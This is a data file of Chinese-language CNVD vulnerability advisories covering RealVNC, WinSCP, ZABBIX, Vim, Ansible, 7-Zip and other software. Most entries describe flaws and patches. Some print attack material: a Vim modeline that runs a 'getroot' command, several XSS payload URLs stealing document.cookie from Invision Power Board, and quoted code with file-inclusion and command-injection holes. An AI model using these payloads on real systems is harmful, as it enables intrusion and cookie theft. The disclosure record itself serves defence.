CNVD-2006-8518, ,Comdev One Admin Pro path[docroot]及path[skin]参数文件包含漏洞,2006/11/16,高,(暂无),"Comdev One Admin Pro是用于为数据库驱动的网站创建PHP模块的平台。Comdev One Admin Pro的多个脚本在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上以Web进程权限执行任意命令。Comdev One Admin Pro的adminfoot.php、adminhead.php和adminlogin.php脚本没有正确地验证path[docroot]及path[skin]参数的输入，允许攻击者通过包含本地或外部资源的文件导致执行任意PHP代码。漏洞相关的代码如下：&lt;? include($path[""docroot""].$path[""skin""].成功攻击要求打开了register_globals。",Null,Comdev------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.conovo.de/script/OneAdminPro.v4.1.zip,Null
CNVD-2008-5059, ,RealVNC CMsgReader::readRect()函数远程代码执行漏洞,2008/10/20,高,(暂无),RealVNC是一款远程控制软件，允许跨网络与桌面应用交互。RealVNC的common/rfb/CMsgReader.cxx文件中的CMsgReader::readRect()函数没有正确地处理编码类型，如果用户受骗连接到了恶意的服务器的话，就可能导致在用户系统上执行任意代码。,Null,RealVNC-------目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://www.realvnc.com/,Null
CNVD-2006-6391, ,RealVNC剪贴板更新整数溢出漏洞,2006/8/19,中,(暂无),RealVNC VNC Server是一款远程终端控制软件。RealVNC的以下函数中存在整数溢出漏洞:rfb/SMsgReader.cxx : readClientCutText()rfb/CMsgReader.cxx : readServerCutText()这些函数用于处理剪贴板更改。如果攻击者能够修改CMsgWriter::clientCutText或SMsgWriter::writeServerCutText以对剪贴板更新发送-1的整数长度的话，就会导致在其他方的堆上分配0字节，然后在所分配的0长度缓冲区之前的地址写入0终止符，最后对该缓冲区执行很大的memcpy操作。当最终出现异常的时候，RealVNC就会终止连接和进程，导致拒绝服务。,Null,RealVNC-------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.realvnc.com/,Null
CNVD-2002-3128, ,VanDyke SecureCRT协议处理远程缓冲区溢出漏洞,2002/7/22,高,(暂无),SecureCRT是一款流行的SSH客户端，可使用在Microsoft Windows操作系统下。SecureCRT对服务器返回的协议版本号信息缺少正确的处理，远程攻击者可以利用这个漏洞进行缓冲区溢出攻击。当SecureCRT连接SSH服务器时，服务程序会返回包含重要和次要数字的协议版本字符串，SecureCRT对返回的协议版本字符串缺少正确的边界缓冲检查，远程攻击者可以利用这个漏洞提交超长的协议版本字符串给SecureCRT处理，可导致客户端产生缓冲区溢出攻击，精心构建提交的协议版本字符串可能以SecureCRT进程的权限在系统中执行任意指令。,Null,VanDyke-------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.vandyke.com/products/securecrt/,Null
CNVD-2006-8467, ,Biba Selenium Web Server多个远程安全漏洞,2006/11/15,中,(暂无),Selenium Server允许用户方便的架设FTP或WEB服务器。Selenium Server在处理传送给DIR、GET和PUT命令的参数时存在输入验证错误，允许攻击者通过特制的目录遍历序列列出并下载根目录外任意位置的文件。此外，Selenium Server将用户口令以明文存储到了Servers目录下，允许攻击者轻易的检索到登录凭据。,Null,Biba Software-------------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://bibasoftware.com/,Null
CNVD-2004-1686, ,Horde Chora Viewer远程命令执行漏洞,2004/6/13,高,(暂无),Chora是一款基于PHP的SVN/CVS知识库查看程序。Horde Chora Viewer对用户提交的输入没有很好的过滤，远程攻击者可以利用这个漏洞以进程权限在系统上执行任意命令。问题存在于chora的diff viewer功能上，攻击者利用PHP的文件上传功能，可以上传到服务器，并且把包含SHELL元字符的数据作为URI参数传递给服务程序，程序将调用exec()函数执行指定的SHELL命令，可以进程权限在系统上执行任意命令。,Null,Horde-----目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：Horde Upgrade chora-1.2.2.tar.gzftp://ftp.horde.org/pub/chora/chora-1.2.2.tar.gz,Null
CNVD-2008-3508, ,Netrw Vim脚本s:BrowserMaps()函数命令执行漏洞,2008/7/16,高,(暂无),"Netrw是一款VIM支持的远程读写文件的插件。Netrw脚本的netrw.vim文件中没有正确地过滤某些语句：$ grep -n exe ~/.vim/autoload/netrw.vim|grep -v -e escape -e Decho -eexecutable | wc -l239当用户打开目录时，会使用execute命令加载键盘映射字符串，但没有过滤容纳当前目录名的b:netrw_curdir变量。在s:BrowserMaps()函数中：1709 if s:didstarstar || !mapcheck(""&lt;s-up>"",""n"")1710 nnoremap &lt;buffer> &lt;silent> &lt;s-up> :Pexplore&lt;cr>1711 endif1712 if g:netrw_mousemaps == 11713 nnoremap &lt;buffer> &lt;silent> &lt;leftmouse> &lt;leftmouse>:call &lt;SID>NetrwLeftmouse(1)&lt;cr>1714 nnoremap &lt;buffer> &lt;silent> &lt;middlemouse> &lt;leftmouse>:call &lt;SID>NetrwPrevWinOpen(1)&lt;cr>1715 nnoremap &lt;buffer> &lt;silent> &lt;s-leftmouse> &lt;leftmouse>:call &lt;SID>NetrwMarkFile(1,&lt;SID>NetrwGetWord())&lt;cr>--> 1716 exe 'nnoremap &lt;buffer> &lt;silent> &lt;rightmouse> &lt;leftmouse>:call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'--> 1717 exe 'vnoremap &lt;buffer> &lt;silent> &lt;rightmouse> &lt;leftmouse>:call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'1718 endif--> 1719 exe 'nnoremap &lt;buffer> &lt;silent> &lt;del> :call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'--> 1720 exe 'vnoremap &lt;buffer> &lt;silent> &lt;del> :call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'--> 1721 exe 'nnoremap &lt;buffer> &lt;silent> D :call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'--> 1722 exe 'vnoremap &lt;buffer> &lt;silent> D :call &lt;SID>NetrwLocalRm(""'.b:netrw_curdir.'"")&lt;cr>'--> 1723 exe 'nnoremap &lt;buffer> &lt;silent> R :call &lt;SID>NetrwLocalRename(""'.b:netrw_curdir.'"")&lt;cr>'--> 1724 exe 'vnoremap &lt;buffer> &lt;silent> R :call &lt;SID>NetrwLocalRename(""'.b:netrw_curdir.'"")&lt;cr>'--> 1725 exe 'nnoremap &lt;buffer> &lt;silent> &lt;Leader>m :call &lt;SID>NetrwMakeDir("""")&lt;cr>'1726 nnoremap &lt;buffer> &lt;F1> :he netrw-quickhelp&lt;cr>因此如果用户受骗打开了带有特制文件名的目录的话，就可能导致执行任意代码。",Null,Dr Chip-------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://mysite.verizon.net/astronaut/index.html,Null
CNVD-2001-0865, ,VIM 状态行执行嵌入式命令漏洞,2001/3/30,低,(暂无),"BUGTRAQ  ID: 2510CVE(CAN) ID: &lt;a href=""http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0408"" target=""_blank"">CVE-2001-0408&lt;/a>VIM是Unix环境下编辑器VI的增强版本，目前版本升级到5.7。攻击者可以在普通文本文件中嵌入恶意命令，当特权用户用VIM打开该文件时，嵌入的命令被执行。为了达到攻击效果，要求打开VIM的修改状态行功能，可以在一个.vimrc中设置""statusline""或""stl""选项。VIM 支持内置函数system()，用于执行命令。在状态行命令中可以使用内置函数system()，而状态行命令本身又可以嵌入在普通文本文件中。于是，可以在一个普通文本文件中放入下列命令：vim:ls=2:stl=%{system('/tmp/getroot&')}该命令指示vim总是显示状态行，并用""/tmp/getroot&""命令的执行结果设置""stl""选项。如果特权用户用VIM打开含有类似命令的文本文件，潜在损害了安全性。&lt;* 来源：Red Hat advisory: RHSA-2001:008-02          &lt;a href='https://listman.redhat.com/pipermail/redhat-watch-list/2001-March/000282.html'>https://listman.redhat.com/pipermail/redhat-watch-list/2001-March/000282.html&lt;/a> *>",Null,,Null
CNVD-2004-1121, ,WinSCP超长URL处理内存破坏漏洞,2004/4/16,高,(暂无),WinSCP是一款开放源代码使用SSH的SFTP和SCP客户端。WinSCP在处理包含超长字符串的'sftp:'或'scp'地址时缺少充分边界检查，远程攻击者可以利用这个漏洞建立恶意链接，诱使WinSCP处理，可触发缓冲区溢出。默认WinSCP为用户提供对 sftp:// 和 scp:// 地址的处理，由于应用程序对超长URL缺少正确边界缓冲区检查，如果HTML页面中包含畸形地址，并诱使用户访问，可导致程序崩溃，精心构建链接数据，可能以进程权限在系统上执行任意指令。,Null,Martin Prikryl--------------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://winscp.sourceforge.net/,Null
CNVD-2003-0318, ,WinSCP SSH2验证本地密码泄露漏洞,2003/1/30,中,(暂无),WinSCP是一款SSH客户端实现。WinSCP没有安全处理密码信息，本地攻击者可以利用这个漏洞恢复用户验证密码信息。WinSCP没有正确处理内存中的信息，允许本地攻击者访问内存或Dump内存信息而获得验证信息。当通过SSH2连接服务器时，攻击者可以搜索内存获得登录信息，如用户的明文密码信息。,Null,Martin Prikryl--------------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://winscp.vse.cz/eng/,Null
CNVD-2009-1352, ,ZABBIX PHP前端多个输入验证漏洞,2009/3/3,高,(暂无),"zabbix是一个CS结构的分布式网络监控系统。ZABBIX的PHP前端存在多个输入验证错误，远程攻击者可以通过提交恶意请求执行跨站请求伪造攻击、读取敏感信息或完全入侵有漏洞的系统。1) include/validate.inc.php中没有正确的过滤对calc_exp2()函数所提交的extlang参数，这可能导致注入并执行任意PHP代码。2) 由于没有检查用户提交请求的有效性，远程攻击者可以通过提交HTTP执行非授权操作。3) locales.php没有正确的验证对srclang参数的输入便用于包含文件，远程攻击者可以通过目录遍历攻击和URL编码的空字节包含本地资源的任意文件。以下是有漏洞的代码段：'srclang'=> array(T_ZBX_STR, O_OPT, NULL, NOT_EMPTY, 'isset({next})'),[...]else if(isset($_REQUEST['next'])){[...]$fileFrom = 'include/locales/'.$_REQUEST['srclang']."".inc.php"";if(file_exists($fileFrom)){include($fileFrom);",Null,ZABBIX SIA----------目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://www.zabbix.org/,Null
CNVD-2006-7705, ,ZABBIX格式串处理及缓冲区溢出漏洞,2006/10/9,高,(暂无),ZABBIX是用于监控网络参数及服务器状态的软件。ZABBIX实现上存在多个格式串及缓冲区溢出漏洞，远程攻击者可能利用这些漏洞诱骗用户连接到恶意的ZABBIX代理导致拒绝服务或执行任意指令。,Null,ZABBIX SIA----------目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://www.zabbix.org/,Null
CNVD-2016-05137,Null,7-Zip本地代码执行漏洞,2016/7/21,高,7-Zip 7-Zip   ;   ,7-Zip是一套免费的、开源的压缩/解压缩软件。7-Zip中存在本地代码执行漏洞，本地攻击者可利用该漏洞在受影响应用程序中执行任意代码，也可能造成拒绝服务。,http://www.securityfocus.com/bid/91798,目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：http://www.7-zip.org/,Null
CNVD-2005-3280,Null,7-Zip ARJ文件处理溢出漏洞,2005/9/26,高,(暂无),7-Zip是一款有着现今最高压缩比的压缩软件，支持独有的7z文件格式及各种其它压缩文件格式。7-Zip在处理大于2600字节的ARJ块时存在边界条件错误，导致在打开特制的ARJ文件时会发生栈溢出。成功利用这个漏洞的攻击者可以远程执行任意代码。,http://www.securityfocus.com/bid/14925,建议：厂商补丁：7-Zip-----目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://prdownloads.sourceforge.net/sevenzip/7z427.exe,7-Zip ARJ文件处理溢出漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/43095
CNVD-2015-04823,Null,Ansible绕过安全限制漏洞,2015/7/24,中,Ansible ansible <1.9.2   ;   ,Ansible是新出现的运维工具是基于Python研发的糅合了众多老牌运维工具的优点实现了批量操作系统配置、批量程序的部署、批量运行命令等功能。Ansible 1.9.2之前版本中存在安全漏洞，攻击者可通过实施符号链接攻击利用该漏洞绕过安全限制，执行未授权操作。,http://www.securityfocus.com/bid/75928,目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：http://releases.ansible.com/ansible/,Ansible绕过安全限制漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/61513
CNVD-2015-00328,Null,Ansible Tower验证绕过漏洞,2015/1/15,中,Ansible Tower <=2.0.2   ;   ,Ansible是简单的配置管理、部署、任务执行、多节点编制框架。Ansible Tower存在验证绕过漏洞，攻击者可以利用此漏洞绕过认证机制，并获得敏感信息。,http://www.securityfocus.com/bid/72020,用户可以联系供应商获得补丁信息：http://www.ansible.com/home,Ansible Tower验证绕过漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/54018
CNVD-2015-00329,Null,Ansible Tower 'is_superuser'参数远程权限提升漏洞,2015/1/15,高,Ansible Tower   ;   ,Ansible是简单的配置管理、部署、任务执行、多节点编制框架。Ansible Tower 'is_superuser'参数存在远程权限提升漏洞，攻击者可以利用此漏洞创建超级管理员帐户，并获得更高的权限。,http://www.securityfocus.com/bid/72021,用户可以联系供应商获得补丁信息：http://www.ansible.com/home,Ansible Tower 'is_superuser'参数远程权限提升漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/54015
CNVD-2013-08668,Null,ansible 'paramiko_ssh.py'安全绕过漏洞,2013/7/3,中,AnsibleWorks Ansible   ;   ,"Ansible是一个模型驱动的配置管理器,支持多节点发布、远程任务执行。Ansible默认配置没有缓存SSH主机密钥，有效地禁用主机密钥检查，允许攻击者利用漏洞绕过安全限制进行未授权操作。",http://seclists.org/oss-sec/2013/q3/1,用户可参考如下厂商提供的安全公告获得补丁信息：https://github.com/ansible/ansible/blob/496f06c3c90cfd89802622c640480328436746c6/lib/ansible/runner/connection_plugins/paramiko_ssh.py,ansible 'paramiko_ssh.py'安全绕过漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/34924
CNVD-2013-01684,Null,Apache Subversion 'svn_fs_file_length()' 远程拒绝服务漏洞,2013/3/11,中,Apache Software Foundation Subversion 1.6.17   ;   ,Subversion是一款开放源码的多用户版本控制系统，支持非ASCII 文本和二进制数据。Apache Subversion 1.6.17及其他版本在'svn_fs_file_length()'在实现上存在远程拒绝服务漏洞。攻击者可利用此漏洞使Apache子进程崩溃，造成拒绝服务。,http://seclists.org/fulldisclosure/2013/Mar/56,,Null
CNVD-2012-5412,Null,iFOBS存在多个跨站脚本漏洞,2012/9/26,中,iFOBS iFOBS 2.x   ;   ,"iFOBS存在多个跨站脚本漏洞。由于通过过""secondName"", ""firstName"", ""thirdName"", ""BirthDay"", ""BirthMonth"", ""BirthYear"", ""address"", ""livePlace"", ""nationality"", ""phone"", ""email"", ""keyword"", ""bankOblastSelect"", ""bankCitySelect"", ""bankRegionSelect"", ""bankDepSelect"", ""bankAddress"", ""bankContacts""参数传递至ifobsClient/regclientprint.jsp的输入在被返回给用户前未能正确过滤，攻击者可以利用漏洞在受影响的站点上下文的用户浏览器会话中执行任意HTML和脚本代码。",http://secunia.com/advisories/50603/,,Null
CNVD-2006-1687,Null,CNVD-2006-1687,2006/3/20,中,(暂无),"危害远程攻击者可以利用漏洞进行跨站脚本攻击，可获得敏感信息。攻击所需条件攻击者必须可以访问Invision Power Board。漏洞信息Invision Power Board是一款基于WEB的论坛程序。Invision Power Board不充分过滤用户提交的输入，远程攻击者可以利用漏洞进行跨站脚本攻击，可获得敏感信息。多个脚本对用户提交的参数缺少过滤，提交恶意脚本代码作为参数数据，并诱使用户访问，可导致脚本在目标浏览器上执行，导致敏感信息泄露。测试方法http://www.example.com/forum/index.php?act=Search&nav=au&CODE=show&searchid=5f25843edb0242889889796819a2b367&search_in=ooo&result_type='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=Search&nav=au&CODE=show&searchid=5f25843edb0242889889796819a2b367&search_in='>&lt;script>alert(document.cookie)&lt;/script>&result_type=postshttp://www.example.com/forum/index.php?act=Search&nav='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?showtopic=1&st='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?s=504b8a357b04e1b276f08a039955177f&act=Search&nav=au&CODE=show&searchid=5f25843edb0242889889796819a2b367&search_in='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?s=21355e75e21dcc4c04e24c5c7247b220&act=Search&CODE=01&forums='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?s='>&lt;script>alert(document.cookie)&lt;/script>&act=Search&CODE=01&forums=allhttp://www.example.com/forum/index.php?act=calendar&code=birthdays&y=[any year]&m='>&lt;script>alert(document.cookie)&lt;/script>&d=[any day]http://www.example.com/forum/index.php?act=calendar&code=birthdays&y='>&lt;script>alert(document.cookie)&lt;/script>&m=[any month]&d=[any day]http://www.example.com/forum/index.php?act=calendar&code=birthdays&y=[any year]&m=[any month]&d='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=Print&client=printer&f=1&t='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=Mail&CODE=00&MID='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=Help&CODE=01&HID='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=search&CODE=getnew&active='>&lt;script>alert(document.cookie)&lt;/script>&lastdate=1http://www.example.com/forum/index.php?act=Members&max_results=10&sort_key=posts&sort_order='>&lt;script>alert(document.cookie)&lt;/script>http://www.example.com/forum/index.php?act=Members&max_results='>&lt;script>alert(document.cookie)&lt;/script>&sort_key=posts&sort_order=deschttp://www.example.com/forum/index.php?act=Members&max_results=10&sort_key='>&lt;script>alert(document.cookie)&lt;/script>&sort_order=desc&sort_order=desc 厂商解决方案目前没有解决方案提供,请关注以下链接：http://www.invisionboard.com/",http://www.securityfocus.com/archive/1/428015,,Null
CNVD-2001-1023,Null,CNVD-2001-1023,2001/5/3,中,(暂无),"Outlook 2000和98以及Outlood Express 5.x的Vcard处理机的缓冲区溢出允许攻击者可以通过发送一个含有畸形的vCard生日域(birthday field)的邮件附件,来执行任何命令。",Null,,Null
CNVD-2001-1024,Null,CNVD-2001-1024,2001/5/3,中,(暂无),"Outlook 2000和98以及Outlood Express 5.x的Vcard处理机的缓冲区溢出允许攻击者可以通过发送一个含有畸形的vCard生日域(birthday field)的邮件附件,来执行任何命令。",Null,,Null
CNVD-2018-24855,Null,SQLite及Chrome SQLite组件远程执行代码漏洞,2018/12/10,高,Sqlite Sqlite   ;   Google Chromium   ;   Google Chrome <71.0.3578.80   ;   Google Android WebView   ;   ,SQLite是一套基于C语言的开源嵌入式关系数据库管理系统。Google Chromium是美国谷歌（Google）公司开发的一款Web浏览器。SQLite及Chrome SQLite组件存在远程执行代码漏洞。攻击者可利用漏洞远程执行代码、泄露程序内存或导致程序崩溃。,https://www.sqlite.org/releaselog/3_26_0.html,用户可参考如下供应商提供的安全公告获得补丁信息：https://chromereleases.googleblog.com/2018/12/stable-channel-update-for-desktop.htmhttps://www.sqlite.org/releaselog/3_26_0.html,SQLite及Chrome SQLite组件远程执行代码漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/146715
CNVD-2018-18745,Null,Google WebRTC VP9越界存储器访问漏洞,2018/9/13,中,Google WebRTC VP9   ;   ,WebRTC名称源自网页实时通信（Web Real-Time Communication）的缩写，是一个支持网页浏览器进行实时语音对话或视频对话的技术。Google WebRTC VP9存在安全漏洞。攻击者可利用漏洞导致Chrome崩溃。此漏洞会影响任何支持VP9的浏览器，并且可以通过加载单个网页来访问（尽管某些浏览器会提示输入权限）。还会影响使用webrtc并支持VP9的本机客户端（例如移动应用程序），但用户必须为其客户端发出或应答视频呼叫，使其处于可以访问此问题的状态。,https://cxsecurity.com/issue/WLB-2018060118,目前没有详细的解决方案提供：https://webrtc.org/native-code/development/,Null
